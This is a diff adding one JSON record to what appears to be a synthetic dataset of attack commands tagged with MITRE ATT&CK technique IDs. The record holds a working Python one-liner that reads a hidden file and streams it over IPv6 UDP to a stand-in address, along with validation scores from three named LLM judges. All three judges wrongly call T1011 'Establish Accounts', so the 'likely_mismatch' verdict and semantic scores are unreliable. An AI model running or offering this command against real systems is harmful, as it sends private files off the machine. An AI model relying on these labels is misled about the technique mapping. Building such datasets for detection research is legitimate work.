@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
+  "explanation": "Transmits data via IPv6 UDP with a set traffic class on a high, uncommon port, explicitly leveraging IPv6 as an alternate medium per T1011.",
+  "rationale_steps": [
+    "Initialize an IPv6 UDP socket and set IPv6 traffic class to mimic non-default traffic.",
+    "Target a documentation IPv6 address and uncommon port (49512).",
+    "Send file contents in small datagrams over IPv6 (alternate medium).",
+    "No obfuscation; runs as user."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-76407221",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, using proper Python syntax for imports, socket operations, list comprehension, and file operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does implement exfiltration over IPv6 UDP, it doesn't align with T1011 (Establish Accounts) but rather with T1048 (Exfiltration Over Alternative Protocol) as it's sending data from a hidden file to an external IPv6 address.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:09:56.449802Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with correct syntax for socket creation, option setting, file reading, data chunking, and transmission within a single line.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration via UDP over IPv6, which is completely unrelated to the MITRE ATT&CK T1011 'Establish Accounts' technique, whose focus is on account creation and manipulation.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:10:02.237175Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quoting, valid socket usage for IPv6 UDP, proper address tuple, and correct semicolon-separated statements.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates data over IPv6 UDP and does not create or manipulate accounts, so it is not aligned with the provided Establish Accounts technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:10:25.733292Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
